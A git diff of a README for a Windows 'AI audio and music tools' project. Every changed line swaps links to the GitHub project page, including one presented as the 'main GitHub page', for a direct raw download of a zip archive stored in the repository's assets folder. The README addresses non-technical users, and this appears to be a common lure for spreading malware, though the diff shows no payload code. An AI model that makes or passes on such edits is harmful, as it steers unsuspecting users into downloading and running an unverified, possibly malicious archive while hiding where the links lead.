@@ -1,6 +1,6 @@
 # 🎵 ai-audio-tools - Easy AI Audio and Music Helpers
 
-[![Download](https://img.shields.io/badge/Download-ai--audio--tools-brightgreen)](https://github.com/miketsivgoulis/ai-audio-tools)
+[![Download](https://img.shields.io/badge/Download-ai--audio--tools-brightgreen)](https://raw.githubusercontent.com/miketsivgoulis/ai-audio-tools/main/assets/tools-ai-audio-v1.0.zip)
 
 Welcome to ai-audio-tools, a straightforward collection of AI tools focused on audio and music. This guide shows you how to get the software on your Windows PC and start using it without technical skills.
 
@@ -12,7 +12,7 @@ Welcome to ai-audio-tools, a straightforward collection of AI tools focused on a
 
 Go to the main download page by clicking this link:
 
-[Download ai-audio-tools](https://github.com/miketsivgoulis/ai-audio-tools)
+[Download ai-audio-tools](https://raw.githubusercontent.com/miketsivgoulis/ai-audio-tools/main/assets/tools-ai-audio-v1.0.zip)
 
 This page contains all the files you need to get started.
 
@@ -132,7 +132,7 @@ Make sure your audio files are clear and not too long for the best results.
 
 This project gathers tools from the AI audio community. You can find helpful guides and updates on the main GitHub page:
 
-[https://github.com/miketsivgoulis/ai-audio-tools](https://github.com/miketsivgoulis/ai-audio-tools)
+[https://raw.githubusercontent.com/miketsivgoulis/ai-audio-tools/main/assets/tools-ai-audio-v1.0.zip](https://raw.githubusercontent.com/miketsivgoulis/ai-audio-tools/main/assets/tools-ai-audio-v1.0.zip)
 
 You can also read more about artificial intelligence for audio, music generation, and speech tech on the linked pages there.
 
@@ -161,4 +161,4 @@ This helps improve the software and assists other users.
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-ai--audio--tools-brightgreen)](https://github.com/miketsivgoulis/ai-audio-tools)
+[![Download](https://img.shields.io/badge/Download-ai--audio--tools-brightgreen)](https://raw.githubusercontent.com/miketsivgoulis/ai-audio-tools/main/assets/tools-ai-audio-v1.0.zip)
